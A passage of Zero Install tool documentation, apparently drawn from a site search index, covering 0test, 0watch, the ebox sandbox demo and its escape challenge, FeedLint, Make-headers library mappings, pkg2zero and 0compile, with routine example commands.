2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post 0.21 skipped 0publish 0.18-post ROX-Lib2 2.0.6-post 0publish 0.18-post ROX-Lib2 2.0.6-post <p>Green = Passed, Red = Failed, Yellow = Skipped. The contents of the cells show the versions of components used in the tests where you didn't specify the version (so 0test selected one for you).</p> <p>We can see in this example that the unit-tests for 0compile 0.19 no longer pass, regardless of the version of Zero Install used. This problem was caused by a change to the GNU-Hello test program it uses within its own tests. Ideally, programs should depend on their test data using <code>&lt;requires&gt;</code> (see below), but 0compile actually needed to test downloading of the test code itself. 0compile 0.20 fails with older version of Zero Install due to a bug in the way \"0launch --get-selections\" generated the XML. 0compile 0.21 depends on a later version explicitly, so the broken combination is skipped.</p> <p>If you specify a test matrix with more than two dimensions, 0test will generate a series of tables.</p>"},{"location":"tools/0test/#other-ways-to-specify-versions","title":"Other ways to specify versions","text":"<p>As well as passing simple version numbers, you can also allow 0test to choose a suitable version given some constraints. This is useful in test scripts:</p>"},{"location":"tools/0test/#ranges","title":"Ranges","text":"<p>You can use <code>,</code> to give a range of possible versions. This is useful with native packages where you don't know the exact version. For example, to test against any Python version 2.6.x (2.6 &lt;= version &lt; 2.7):</p> <pre><code>$ 0test prog.xml https://apps.0install.net/python/python.xml 2.6,2.7\nPassed\n - prog 0.1, python v2.6.8-0.2\n</code></pre>"},{"location":"tools/0test/#nonlocal","title":"%nonlocal","text":"<p>Don't select a local (i.e. unreleased) version to test against:</p> <pre><code>$ 0test prog.xml\nPassed\n - prog 0.1, lib v1.11-post\n\n$ 0test prog.xml http://example.com/lib %nonlocal\nPassed\n - prog 0.1, lib v1.11\n</code></pre>"},{"location":"tools/0test/#passing-test-arguments","title":"Passing test arguments","text":"<p>You can pass extra arguments to the test command, but you must put them after <code>--</code> to stop 0test interpreting them as arguments or versions. e.g. to run 0test on 0compile with verbose output:</p> <pre><code>$ 0test https://apps.0install.net/0install/0compile.xml -- -v\n</code></pre>"},{"location":"tools/0test/#specifying-a-test-command","title":"Specifying a test command","text":"<p>The <code>--test-command</code> (or <code>-t</code>) option can be used to run the shell command of your choice, rather than the \"test\" <code>&lt;command&gt;</code> given in the feed. The command that would be executed if the implementation were run normally is available as <code>$*</code>.</p> <p>For example, to check that <code>rox --version</code> worked in versions 2.8 and 2.9 of ROX-Filer:</p> <pre><code>$ 0test -t '$* --version &gt; /dev/null' \\\n    http://rox.sourceforge.net/2005/interfaces/ROX-Filer 2.8 2.9\nPassed\n - ROX-Filer v2.8\n - ROX-Filer v2.9\nNone skipped\nNone failed\n</code></pre> <p>You can use <code>--command</code> to select a different <code>&lt;command&gt;</code>. By default, the command used is <code>test</code> when run normally, or <code>run</code> when using <code>-t</code>. You can also set this to the empty string to select no command (useful with libraries). In that case, <code>$1</code> is the directory itself rather than the command.</p>"},{"location":"tools/0test/#test-only-dependencies","title":"Test-only dependencies","text":"<p>You can pass extra arguments and specify test-specific dependencies in the <code>&lt;command&gt;</code>, as usual. For example:</p> <pre><code>  &lt;group&gt;\n    &lt;requires interface=\"http://example.com/somelib.xml\"&gt;\n      ...\n    &lt;/requires&gt;\n    &lt;command name=\"test\" path=\"tests/testall.py\"&gt;\n      &lt;requires interface=\"http://testing.com/testframework.xml\"&gt;\n        &lt;environment insert=\"\" mode=\"replace\" name=\"TEST_FRAMEWORK\"/&gt;\n      &lt;/requires&gt;\n    &lt;/command&gt;\n    &lt;implementation id=\".\" version=\"0.1-pre\"/&gt;\n  &lt;/group&gt;\n</code></pre>"},{"location":"tools/0watch/","title":"0watch","text":"<p>Maintainer: Bastian Eicher License: GNU Lesser General Public License Source: https://github.com/0install/0watch Zero Install feed: https://apps.0install.net/0install/0watch.xml</p> <p>0watch scans websites for new releases using arbitrary Python code snippets. When new releases are detected 0template is used to create/update a Zero Install feed.</p> <p>To make the <code>0watch</code> command available on your command-line you can run:</p> <pre><code>0install add 0watch https://apps.0install.net/0install/0watch.xml\n</code></pre> <p>To use 0watch you need both a template file named like <code>MyApp.xml.template</code> and watch file named like <code>MyApp.watch.py</code> in the same directory. You can then run:</p> <pre><code>0watch MyApp.watch.py\n</code></pre>"},{"location":"tools/0watch/#details","title":"Details","text":"<p>A watch file is a Python script that pulls a list of releases from a website. It must set an attribute named <code>releases</code> to an array of dictionaries. Each array element represents to a single release and each dictionary tuple is a variable substitution for the template.</p> <p>A basic watch file could look like this:</p> <pre><code>from urllib import request\nimport json\ndata = request.urlopen(request.Request('https://api.github.com/repos/myproj/myapp/releases')).read()\nreleases = [{'version': release['tag_name'], 'released': release['published_at'][0:10]} for release in json.loads(data)]\n</code></pre> <p>For each release reported by the watch file 0watch attempts to determine whether the version is already known. It does this by:</p> <ul> <li>checking if a file named <code>MyApp-VERSION.xml</code> exists in the same directory and</li> <li>checking if a file named <code>MyApp.xml</code> exists in the same directory and contains an implementation with the version.</li> </ul> <p>0watch then calls 0template once for each new release.</p>"},{"location":"tools/ebox/","title":"ebox","text":"<p>Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/ebox Zero Install feed: http://0install.net/tests/ebox.xml</p> <p>EBox is a proof-of-concept that integrates Zero Install's safe installation with E's sandboxing features. It allows you to install programs and run them in a restricted environment. Despite this, the programs still benefit from Zero Install's dependency handling, automatic updates, sharing, etc.</p>"},{"location":"tools/ebox/#overview","title":"Overview","text":"<p>A secure system should allow the user to install and run software with limited privileges, so that the damage that can be caused by malicious software is limited. The sandboxing should be simple enough that it can be used by all users as a matter of course.</p> <p>Zero Install is designed to solve the installation part of this problem, and is intended to integrate with existing sandboxing tools to provide the rest. The purposes of this page are:</p> <ul> <li>To make it clear what we hope to achieve with Zero Install.</li> <li>To demonstrate that such integration is possible, and provide an example of how to do it.</li> <li>To find bugs or weaknesses in Zero Install's implementation or design.</li> </ul> <p>Different sandboxes provide different features. Ideally we would use an OS-level tool that could sandbox any application (e.g. Plash). However, these are not yet widely available, difficult to deploy, or only available on certain systems. Therefore, this example uses application-level sandboxing instead (relying on security features of the programming language rather than those of the operating system). The advantage is that it should work everywhere. The disadvantage is that it only works with programs written in that language.</p> <p>We start with a tutorial showing how to install and run a couple of sample applications. Then we present a challenge: modify the sample applications to escape from the sandbox! If you find a security flaw, please report it to the mailing list, and I'll add you to the high-score table:</p> Date Finder Flaw - (your name here!) - <p>(challenge open since Aug 2010)</p>"},{"location":"tools/ebox/#tutorial","title":"Tutorial","text":"<p>You can create a short-cut to ebox with <code>0install add</code>, like this:</p> <pre><code>0install add ebox http://0install.net/tests/ebox.xml\n</code></pre> <p>You can then install a program like this:</p> <pre><code>$ ebox ~/edit http://0install.net/tests/ebox-edit.xml\nCreated instance directory. To run:\n~/edit/AppRun\n</code></pre> <p>This creates a directory at the path you specified (<code>~/edit</code>). This directory contains all the program's configuration, and a script to start it (AppRun).</p> <p>[ Technically, it's a ROX application directory, but whereas these normally include program code (but no configuration), this one includes only configuration, with the code going in the Zero Install cache. ]</p> <p>If you run the <code>~/edit/AppRun</code> script, a fairly normal-looking text editor should appear. You can open, edit and save files just as you'd expect:</p> <p></p> <p>However, the program is running in a restricted environment. It can only access files that you select using a file selector dialog box. It's hard to demonstrate this security, because permission is granted automatically by your actions, so you should try attacking it to convince yourself.</p>"},{"location":"tools/ebox/#what-a-boxed-program-can-and-cant-do","title":"What a boxed program can and can't do","text":"<ul> <li>Every window it opens is prefixed with the name you gave it (e.g. <code>edit: &lt;untitled&gt;</code>).</li> <li>It can't access a file unless you explicitly select it, or pass it as a command-line argument.</li> <li>It can't send a copy of a file you open over the network (see below for network access).</li> <li>It can read and write files under its own <code>data</code> directory (<code>~/edit/data/*</code>)</li> <li>If you grant it access to something (e.g. read access to a file), it could persist this in <code>~/edit/auths/*</code> so it still has it next time you run the program, although ebox-edit itself doesn't do this.</li> <li>It can open any number of windows, use up lots of CPU time, etc.</li> </ul>"},{"location":"tools/ebox/#networking","title":"Networking","text":"<p>Next, we'll try a program that uses the network:</p> <pre><code>$ ebox alicesChat http://0install.net/tests/ebox-chat.xml\n</code></pre> <p>Notice that ebox-chat uses the same library (ebox-help) as ebox-edit, and so they share a single copy:</p> <p></p> <p>ebox-chat is a simple chat program. When you run it, it will ask for permission to access the network:</p> <p></p> <p>Once you give it network access, it is able to store it for later (creating the file <code>alicesChat/auths/network</code>), so you won't have to reconfirm each time it starts. It then displays an (empty) list of contacts.</p> <p>We'll need someone to talk to. This could be on another machine, or you can take advantage of the sandboxing to create a second instance on the same machine. We'll pretend that the first instance is running on Alice's computer, and the second is Bob's:</p> <pre><code>$ ebox bobsChat http://0install.net/tests/ebox-chat.xml\n</code></pre> <p>We don't have to worry that these two programs will conflict or try to use the same configuration; they can each only access files inside their own directory by default. Of course, the actual program code is shared between them. When you run bobsChat, you'll need to grant that network access too.</p> <p>Add a contact called \"Bob\" to Alice's contacts list, and a contact called \"Alice\" to Bob's list. One of them should send an invitation (a file), and the other should accept it. The invitation file should be transferred over some secure channel and kept safe until pairing is complete.</p> <p>Note that ebox-chat is a peer-to-peer chat program with no central server. If there are firewalls or NATs between the machines, things get \"interesting\"... it's only a demo after all ;-)</p> <p></p> <p>Once paired, either party can call the other:</p> <p></p>"},{"location":"tools/ebox/#the-challenge","title":"The challenge!","text":"<p>I have a file, <code>/home/tal/precious.txt</code>, containing some important information. Your challenge is to either discover the contents of this file or to change it. You do this by creating a malicious application (e.g. by modifying ebox-edit or ebox-chat). I will install your program and try using it for a bit.</p> <ul> <li>If Zero Install warns me that your key isn't trusted, I'll ignore it and trust the key anyway.</li> <li>I will also approve any keys needed for any libraries you depend on.</li> <li>Since I don't trust your program, I won't try to open my precious file in it. I will be happy to create and edit test files, though.</li> <li>The <code>precious.txt</code> file has no special protection: it's a regular text file, readable and writable by me (if I ask ebox-edit to open it, it will).</li> <li>For this challenge, we exclude denial-of-service attacks (e.g. if you make my computer run so slowly I have to reboot it).</li> </ul> <p>The easiest way to get started is to clone ebox-edit's Git repository and create a new instance from its local feed:</p> <pre><code>$ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/ebox-edit\n$ ebox test-instance ebox-edit/edit.xml\n$ ./test-instance/AppRun\n</code></pre> <p>You can try to modify the files in the checkout to escape from the sandbox. The syntax is explained in the Walnut guide to E.</p>"},{"location":"tools/ebox/#bonus-challenge","title":"Bonus challenge!","text":"<p>Alternatively, you could clone the ebox-help Git repository and modify the library. Register your modified library with 0install (using <code>0install add-feed ebox-help/help.xml</code>) and run a program that depends on it. You should find that the library runs in an even more restricted environment; it doesn't even get access to the application data!</p> <p>This demonstrates an interesting feature of ebox. Zero Install normally tells a component (such as ebox-edit) how to find a dependency (ebox-help) by setting environment variables (e.g. <code>$CLASSPATH</code>). Environment variables are global to the process. Instead, ebox makes the dependency appear directly as a variable in the module's scope. For example, ebox-edit declares a dependency on ebox-help like this:</p> <pre><code>    &lt;requires interface=\"http://0install.net/tests/ebox-help.xml\"&gt;\n      &lt;environment insert=\"\" name=\"help\"/&gt;\n    &lt;/requires&gt;\n</code></pre> <p>It then creates a help window by calling <code>&lt;help:makeHelp&gt;(shell, &lt;this:manual&gt;)</code>. Here, the <code>&lt;help&gt;</code> loader is injected directly by ebox, and scoped to the ebox module:</p> <ul> <li>To code in ebox-edit, <code>&lt;help&gt;</code> refers to the ebox-help library, while <code>&lt;this&gt;</code> refers to ebox-edit.</li> <li>To code in ebox-help, <code>&lt;help&gt;</code> is not visible, while <code>&lt;this&gt;</code> refers to ebox-help.</li> </ul> <p>This means that libraries can't conflict even within a process. elib-help can't override a function defined in ebox-edit, for example, so the ebox-edit author doesn't need to fully trust the help library!</p>"},{"location":"tools/ebox/#notes","title":"Notes","text":"<p>To make this useful, we need to integrate with a general purpose sandbox, such as Plash, so we can sandbox any application, not just those written in E.</p> <p>The long startup time for edit and chat is simply because they're running on Java, not because of the sandboxing.</p> <p>If a networked application (e.g. ebox-chat) seems to freeze, try wiggling the mouse; it might just need more entropy to generate random numbers for the crypto.</p> <p>About E: the important point here isn't how this particular sandbox works, but how sandboxing can be supported by Zero Install in general. However, here are some useful links about E and its underlying security model:</p> <ul> <li>http://wiki.erights.org/wiki/Walnut/Secure_Distributed_Computing</li> <li>https://en.wikipedia.org/wiki/Object-capability_model</li> </ul>"},{"location":"tools/ebox/#conclusions","title":"Conclusions","text":"<p>Zero Install can be used to install and run sandboxed software. It does not execute any of the downloaded code outside of the sandbox and installation of malicious code does not affect other programs on the computer, even those running as the same user. Despite this, libraries are shared automatically between programs (sandboxed or not), update notifications work as normal, etc.</p> <p>In addition to its normal mode of operation, in which it sets environment variables to let components find their dependencies, Zero Install can also integrate tightly with a particular programming language, injecting scoped dependencies directly into individual modules within the language.</p>"},{"location":"tools/feedlint/","title":"FeedLint","text":"<p>Maintainer: Thomas Leonard License: GNU General Public License Source: http://repo.or.cz/w/FeedLint.git Zero Install feed: https://apps.0install.net/0install/feedlint.xml</p> <p>If you maintain a number of feeds, each with several versions of your programs, how do you know that all the download links are still OK? Run FeedLint on your feeds from time-to-time to check.</p> <p>To use it, pass the URLs of the feeds to check as arguments, e.g.:</p> <pre><code>0install add feedlint https://apps.0install.net/0install/feedlint.xml\nfeedlint http://my/feed.xml\n</code></pre> <p>You can pass multiple feeds as arguments and it will check all of them. For each feed, it will:</p> <ul> <li>Download the feed and check it can be read by 0install.</li> <li>Check that all signatures are correct and by keys on your keyring.</li> <li>Check that each signature's GPG key can be downloaded.</li> <li>Check that the homepage and icon URLs work.</li> <li>Get the size of each implementation archive and check that it matches the size in the feed.</li> <li>Warn about releases marked as Testing which are more than one week old.</li> <li>Recursively check any sub-feeds and dependencies listed in the feed (if run with <code>-d</code>)</li> </ul> <p>Tip: to check all feeds in your domain (e.g. <code>example.com</code>):</p> <pre><code>0install list example.com | xargs feedlint\n</code></pre>"},{"location":"tools/feedlint/#sample-output","title":"Sample output","text":"<p>Here we ask it to check Edit's feed (and it also checks ROX-Lib, on which Edit depends; note that this mode now requires the <code>-d</code> option to be used):</p> <p></p>"},{"location":"tools/make-headers/","title":"Make-headers","text":"<p>Maintainer: Thomas Leonard License: GNU General Public License Source: http://repo.or.cz/w/make-headers.git Zero Install feed: http://0install.net/2007/interfaces/Make-headers.xml</p> <p>Make-headers is an extremely simple script for creating <code>-dev</code> packages (packages containing only header files) from ordinary source releases. It performs the following steps:</p> <ol> <li>Runs <code>$SRCDIR/configure --prefix $DESTDIR &amp;&amp; make install</code></li> <li>Notes the version numbers in any lib*.so symlinks (see below)</li> <li>Deletes <code>$DESTDIR/{bin,man,share}</code>, any library binaries (<code>.so</code>, <code>.a</code> and <code>.la</code> files in <code>lib</code>), and any <code>lib/python</code>* directories.</li> <li>Edits any pkg-config files (<code>lib/pkgconfig/*.pc</code>) to use a relative prefix of <code>${pcfiledir}/../..</code>.</li> </ol> <p>In other words, it does a full compile-and-install to $DESTDIR, deletes anything that isn't needed in a <code>-dev</code> package, and makes the result relocatable. It can be used as the compile command in a source implementation. For example, the GLib-dev feed contains this entry:</p> <pre><code>  &lt;group arch=\"*-src\" compile:command='\"$BUILD_COMMAND\"'&gt;\n    &lt;implementation id=\"sha1new=fd1cf4afd14067866e626a2c91f9839f4639e604\"\n                    released=\"2007-03-04\" stability=\"stable\"\n            version=\"2.4.8\"&gt;\n      &lt;archive extract=\"glib-2.4.8\"\n               href=\"ftp://ftp.gtk.org/pub/gtk/v2.4/glib-2.4.8.tar.bz2\"\n           size=\"2152755\"\n           type=\"application/x-bzip-compressed-tar\"/&gt;\n    &lt;/implementation&gt;\n    &lt;requires interface=\"http://0install.net/2007/interfaces/Make-headers.xml\"&gt;\n      &lt;environment insert=\"make-headers.py\" name=\"BUILD_COMMAND\"/&gt;\n    &lt;/requires&gt;\n</code></pre> <p>This allows 0compile to create the GLib-dev package from the upstream source automatically.</p> <p>Note</p> <p>If your package creates script files in <code>bin</code> that are part of the <code>-dev</code> package (i.e. they are used when building programs that use the library) then use <code>--keep=bin</code> to prevent them from being deleted.</p>"},{"location":"tools/make-headers/#major-version-mappings","title":"Major version mappings","text":"<p>There is a particular issue that comes up if you want to provide the header files (<code>*.h</code>) through Zero Install, but have the user get the run-time files (*.so) through their distribution. First, some background:</p>"},{"location":"tools/make-headers/#library-versioning-on-linuxunix-systems","title":"Library versioning on Linux/Unix systems","text":"<p>The obvious way to store a shared library object in a package is to give it a simple name like <code>libfoo.so</code>. The packaging system selects which version of this file to use and the program loads it. Easy. This is how a pure Zero Install system would work.</p> <p>However, in a traditional packaging system (apt, make install, etc), where library files go in a single directory (e.g. <code>/usr/lib</code>), this would make it impossible to have two versions of a library installed at once. As a special work-around, shared library objects include their version number in their name (e.g. <code>libfoo.so.1.2.3</code>). You (or your package manager) then adds two symlinks:</p> <ul> <li><code>libfoo.so</code> is the symlink used when compiling</li> <li><code>libfoo.so.1</code> is the symlink used when running (here <code>1</code> is the \"major\" part of the version number from our example of <code>1.2.3</code>)</li> </ul> <p>The idea is that you make sure <code>libfoo.so</code> points to the correct version and then compile your code. The compiled binary takes the first part of the version number (here <code>1</code>) and stores <code>libfoo.so.1</code> as its dependency. When run, it uses the second symlink to find the actual library version. Minor (compatible) upgrades to the library have the same major version. For example, after installing a minor update the symlinks will point to <code>libfoo.so.1.3.0</code>, still with major version <code>1</code>.</p> <p>For major (incompatible) changes, the major version number is changed. After installing a major upgrade (<code>2.0.0</code>), you have three symlinks:</p> <ul> <li><code>libfoo.so.1</code> to <code>libfoo.1.2.3</code> (from the previous version)</li> <li><code>libfoo.so.2</code> to <code>libfoo.2.0.0</code></li> <li><code>libfoo.so</code> to <code>libfoo.2.0.0</code></li> </ul> <p>Programs that need version 1 of the library can no longer be compiled (they try to use <code>libfoo.so</code> and fail), but any existing binaries will still run (they try to use <code>libfoo.so.1</code> and succeed). This is pretty horrible, but it's the way it works. The real problem is that the source code doesn't say what major version of the library it needs; it just fails to compile if you get it wrong, and you can only have the ability to compile against one version at a time.</p> <p>Obviously, this scheme doesn't work in Zero Install, since installing a package is always side-effect-free. Preventing old programs from compiling would clearly be a side-effect.</p> <p>In a pure Zero Install system, you can always use the simple scheme above and everything works correctly. In fact, to avoid changing existing libraries, we usually do include the version number in the library name, and we include both symlinks in the runtime package. This doesn't do any harm, because Zero Install keeps files from different packages in different places.</p>"},{"location":"tools/make-headers/#using-zero-install-dev-packages-with-distribution-runtime-packages","title":"Using Zero Install -dev packages with distribution runtime packages","text":"<p>However, what if you want to combine both systems? That is, what if you want to get the header files through Zero Install but get the runtime shared object through your distribution's packaging system? Then there is a small problem. In Zero Install, we have:</p> <ul> <li>A library package contains the <code>libfoo.so</code> and <code>libfoo.so.version</code> files.</li> <li>A <code>-dev</code> package contains the header files.</li> </ul> <p>In a distribution package:</p> <ul> <li>A library package contains the <code>libfoo.so.version</code> file only.</li> <li>A <code>-dev</code> package contains headers and the <code>libfoo.so</code> file (only one <code>-dev</code> package can be installed at once).</li> </ul> <p>So, if you tried to use a Zero Install <code>-dev</code> package with a distribution library package, no one provides the <code>libfoo.so</code> file and the link fails.</p> <p>To fix this, a Zero Install <code>-dev</code> package can specify the mappings from library names to major version numbers, like this:</p> <pre><code>&lt;interface uri='.../libfoo-dev'&gt;\n  ...\n  &lt;implementation compile:lib-mappings=\"foo:1\" ... /&gt;\n</code></pre> <p>When 0compile compiles anything that depends on this <code>-dev</code> package, it searches for <code>libfoo.so.1</code> (provided by the distribution) in the library search path and creates a symlink to it named <code>libfoo.so</code> in a temporary directory, which it adds to the search path. Programs should then compile correctly without modifications. Multiple mappings can be given in the attribute, separated by spaces.</p> <p>To be clear: a Zero Install source package depends on the library <code>-dev</code> package using the normal Zero Install mechanism (<code>&lt;requires ...&gt;</code> <code>&lt;version ...&gt;</code>). Having selected a suitable version of the <code>-dev</code> package, Zero Install uses the mappings inside it to work out what the compiled binary should link against.</p> <p>The source for a <code>-dev</code> package can use <code>compile:binary-lib-mappings</code> to have this value placed in the generated <code>-dev</code> \"binary\" package. However, starting with version 0.3, Make-headers can automatically work out the correct values and add them to the feed.</p> <p>In summary:</p> <ul> <li>If you are creating a source package that depends on a library, ignore all this and just put in a normal Zero Install dependency. 0compile will handle the mappings for you.</li> <li>If you are publishing an existing <code>-dev</code> package for a library that isn't in Zero Install, remember add the <code>lib-mappings</code> attribute.</li> <li>If you are publishing source for a <code>-dev</code> package, Make-headers should add the correct values for you automatically.</li> </ul>"},{"location":"tools/pkg2zero/","title":"pkg2zero","text":"<p>Maintainer: Thomas Leonard License: GNU General Public License Source: http://repo.or.cz/w/deb2zero.git Zero Install feed: http://0install.net/2009/interfaces/pkg2zero.xml</p> <p>pkg2zero takes a Debian or RPM package and publishes it in a Zero Install feed.</p> <p>You can always use 0publish to publish any tarball, RPM, Deb, Zip or Autopackage file, but you have to enter the meta-data (name, summary, description, etc) manually. Since Debian and RPM packages already contain this information, it's easier to extract it and generate the feed automatically. This is what pkg2zero does.</p> <p>You can download pkg2zero and create a short-cut to it in the usual way:</p> <pre><code>0install add pkg2zero http://0install.net/2009/interfaces/pkg2zero.xml\n</code></pre>"},{"location":"tools/pkg2zero/#creating-the-feed","title":"Creating the feed","text":"<p>Select the Debian or RPM package you want to publish. You need the full URL. Since packages sometimes move, you should probably make a copy of it on your own server and use that URL, but for this demo we'll link directly to Debian's copy of the program (GQView for this tutorial):</p> <pre><code>pkg2zero http://ftp.uk.debian.org/debian/pool/main/g/gqview/gqview_2.0.1-1_i386.deb GQView.xml\n</code></pre> <p>This downloads the Debian package to the current directory and creates a feed called <code>GQView.xml</code>.</p> <p>Alternatively, to create the feed from an RPM:</p> <pre><code>pkg2zero http://dag.wieers.com/rpm/packages/gqview/gqview-1.4.5-1.el5.rf.i386.rpm GQView.xml\n</code></pre> <p>You will be prompted to give a URL for the program's icon, since Debian packages don't have them.</p> <p>You will then be prompted to \"Enter the URI for this feed\". This is the URL from which other people will download your feed file.</p> <p>Note</p> <p>pkg2zero guesses some things (such as which binary to run by default if the package contains several) so you should check the feed file manually and edit if required. In this case, no editing is needed.</p>"},{"location":"tools/pkg2zero/#testing","title":"Testing","text":"<p>When testing, you should make sure that the program isn't already installed (e.g. by <code>apt-get</code>). Some programs contain hard-coded paths, and will therefore appear to work correctly... but only on a system which already has the program! Also, Zero Install may select the natively-installed version, depending on your policy settings.</p> <p>To test the feed:</p> <pre><code>$ 0install run -g ./GQView.xml\n</code></pre> <p>Note that pkg2zero added the downloaded package's contents to the Zero Install cache, so it will show up as being already cached.</p>"},{"location":"tools/pkg2zero/#publishing","title":"Publishing","text":"<p>If you want to publish the feed so that others can use it, you'll also need to sign it, which can be done by giving the GPG key to use with the <code>--key</code> option:</p> <pre><code>$ pkg2zero -k Bob http://.../package.deb\n</code></pre> <p>Note that if this version was already added then it pkg2zero won't do anything, so if you already made an unsigned feed then delete it first, or use 0publish --xmlsign to resign it.</p> <p>See the packaging tutorial for more details about signing feeds.</p>"},{"location":"tools/pkg2zero/#adding-more-versions","title":"Adding more versions","text":"<p>To add a new version to your feed later, just run the command again with the new URL:</p> <pre><code>$ pkg2zero http://.../new-version.deb GQView.xml\n</code></pre>"},{"location":"tools/pkg2zero/#using-a-debian-packages-file","title":"Using a Debian Packages file","text":"<p>As an alternative to specifying the URL of the Debian package directly, you can download an index file to the current directory and then just give the package name. e.g. to use the current Debian/stable package for the amd64 (<code>x86_64</code>) architecture:</p> <pre><code>$ wget ftp://ftp.debian.org/debian/dists/stable/main/binary-amd64/Packages.bz2\n$ pkg2zero --packages-file=Packages.bz2 gqview GQView.xml\n</code></pre>"},{"location":"tools/pkg2zero/#using-rpm-repository-metadata","title":"Using RPM Repository Metadata","text":"<p>As an alternative to specifying the URL of the RPM package directly, you can download the repodata to the current directory and then just give the package name. e.g.</p> <pre><code>$ mkdir -p repodata\n$ wget -N -P repodata http://download.fedoraproject.org/pub/epel/5/i386/repodata/repomd.xml\n$ wget -N -P repodata http://download.fedoraproject.org/pub/epel/5/i386/repodata/...-primary.xml.gz\n$ pkg2zero --repomd-file=repodata/repomd.xml -m http://download.fedoraproject.org/pub/epel --path 5/i386 gqview GQView.xml\n</code></pre>"},{"location":"tools/pkg2zero/#dependencies","title":"Dependencies","text":"<p>pkg2zero can process the <code>Depends</code> field in a Debian package and generate a corresponding <code>&lt;requires&gt;</code> element in the feed. For this to work, you need to create a file called <code>~/.config/0install.net/pkg2zero/mappings</code> (see the freedesktop.org basedir specification for details about configuration file locations). Each line of the file gives a mapping from a Debian package name to the corresponding Zero Install feed URI. For example, if you specify:</p> <pre><code>libfoo: http://0install.net/2008/3rd-party/libfoo.xml\n</code></pre> <p>then <code>pkg2zero</code> will turn</p> <pre><code>Depends: libfoo\n</code></pre> <p>into</p> <pre><code>  &lt;requires interface=\"http://0install.net/2008/3rd-party/libfoo.xml\"&gt;\n    &lt;environment insert=\"usr/lib\" name=\"LD_LIBRARY_PATH\"/&gt;\n  &lt;/requires&gt;\n</code></pre> <p>Note that setting <code>LD_LIBRARY_PATH</code> is just a guess. It may be that the package depends on <code>libfoo</code> in some other way (e.g. it needs a binary in <code>$PATH</code>). In that case, you'll need to edit the feed to correct it.</p> <p>When you create a new feed, pkg2zero automatically appends the new mapping to the mappings file for you. The last line of the file is also used to suggest a default when naming new feeds.</p>"},{"location":"tools/pkg2zero/#security-notes","title":"Security notes","text":"<p>pkg2zero does not verify anything about the archive it downloads when you use a URL. However, if a file with the same name already exists in the current directory, it uses that instead. Therefore, if you have a secure way of getting the .deb file (e.g. because you created it), use that.</p> <p>pkg2zero calculates the digest of the package and stores it in the feed it creates, so anyone using the feed can at least verify that the package they download is identical to the one you used.</p> <p>If you use a Packages index file, then it does check the digest against the one in the Packages file.</p>"},{"location":"tools/0compile/","title":"0compile","text":"<p>Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0compile Zero Install feed: https://apps.0install.net/0install/0compile.xml</p> <p>Normally, Zero Install will select a pre-built binary for your system. However, it can also be used to compile a new binary from a source package. This is useful if:</p> <ul> <li>no binary is available for your platform;</li> <li>you wish to build using different library versions; or</li> <li>you wish to make changes to a program or library.</li> </ul> <p>This tutorial shows how to use <code>0compile</code> for these purposes. It is assumed that you have already installed Zero Install and know how to run programs using it. To get <code>0compile</code> itself, use:</p> <pre><code>0install add 0compile https://apps.0install.net/0install/0compile.xml\n</code></pre> <p>Note</p> <p>This page describes the command-line interface to <code>0compile</code>. There is also a graphical interface, which is used when you click on the Compile button in the 0install GUI. The graphical interface provides similar options, but is slightly more limited.</p>"},{"location":"tools/0compile/#autocompile","title":"Autocompile","text":"<p>If you just want to compile some existing source code (without changing it), then the <code>autocompile</code> sub-command does the job. Given the URI of a program, it will download and compile the source in a temporary directory, add the resulting binary to the Zero Install cache, and register the new binary. If the source depends on other programs, it will also download and compile them in the same way if no binary is currently available for the preferred version.</p> <p>For example (GNU-Hello is a simple test program which depends only on <code>make</code>):</p> <pre><code>$ 0compile autocompile http://0install.net/tests/GNU-Hello.xml\n================= http://0install.net/tests/GNU-Hello.xml ==================\n\nSelecting versions for GNU Hello...\nSelection done.\n\nPlan:\n\n- GNU Hello: Compile 1.3 (sha1=2aae32fd27d194167eac7eb611d7ce0983f83dd7)\n  - make: Use existing binary 3.81-5 (Linux-x86_64)\n\nNo dependencies need compiling... compile GNU Hello itself...\nWaiting for selected implementations to be downloaded...\n\n...\n</code></pre> <p>Note that GNU-Hello does not get the C-compiler through Zero Install, so you will need that already (hint: <code>apt-get install build-essential</code>). Once compiled, you can run it like this:</p> <pre><code>$ 0install run http://0install.net/tests/GNU-Hello.xml\nHello, world!\n</code></pre> <p>You can also use <code>autocompile --gui</code> for a graphical version. This makes it easier to see the overall progress, because the verbose build output is shown separately in the lower pane:</p> <p></p>"},{"location":"tools/0compile/#manual-compilation","title":"Manual compilation","text":"<p>If you want to modify the source before building, keep the object files around for rebuilding, or choose the versions used, you'll want to use the manual commands, described in the following sections.</p>"},{"location":"tools/0compile/#creating-the-build-environment","title":"Creating the build environment","text":"<p>To get started, run <code>0compile setup</code> with the URL of the program you want to build. In this example, we'll use GNU-Hello, a simple program written by the FSF to demonstrate use of the popular GNU build tools:</p> <pre><code>$ 0compile setup http://0install.net/tests/GNU-Hello.xml GNU-Hello\nCreated directory GNU-Hello\n</code></pre> <p><code>0compile</code> will run <code>0install select --source</code> to select a suitable version of the source code and download it. It will also locate and download any dependencies (e.g. build tools or header files) the source may have. It will download the <code>make</code> utility in this case, or use your distribution's package.</p> <p>The final argument names a directory for the build environment. If omitted, it defaults to the last component of the URI, without the <code>.xml</code> extension (so we could have just left it off in this case). <code>0compile</code> will create this directory in the current directory.</p> <p>All further <code>0compile</code> commands are run from inside this new directory, which is currently empty except for a <code>0compile.properties</code> file recording the URI of the program. If you want to change the selected version(s) later, do:</p> <pre><code>$ cd GNU-Hello\n$ 0compile setup\n</code></pre>"},{"location":"tools/0compile/#building","title":"Building","text":"<p>To compile the program, use the <code>build</code> command (from inside the <code>GNU-Hello</code> directory):</p> <pre><code>$ 0compile build\nTMPDIR=/tmp/0compile-T5GJBj\nBUILDDIR=/home/me/GNU-Hello/build\nDISTDIR=/home/me/GNU-Hello/gnu-hello-linux-x86_64-1.3\nSRCDIR=/home/me/.cache/0install.net/implementations/...\ncd /tmp/GNU-Hello/build\nExecuting: \"$SRCDIR/configure\" --prefix=\"$DISTDIR\" &amp;&amp; make install\n...\n</code></pre> <p>Note</p> <p>GNU-Hello does not use Zero Install to get the C compiler (<code>gcc</code>) or the standard library header files (<code>libc-dev</code>), so you should install these yourself. They come with most distributions.</p> <p><code>0compile</code> starts by creating two sub-directories: <code>gnu-hello-linux-x86_64</code> for the final result (the exact name will depend on your system) and <code>build</code> for any temporary files. It then executes a command 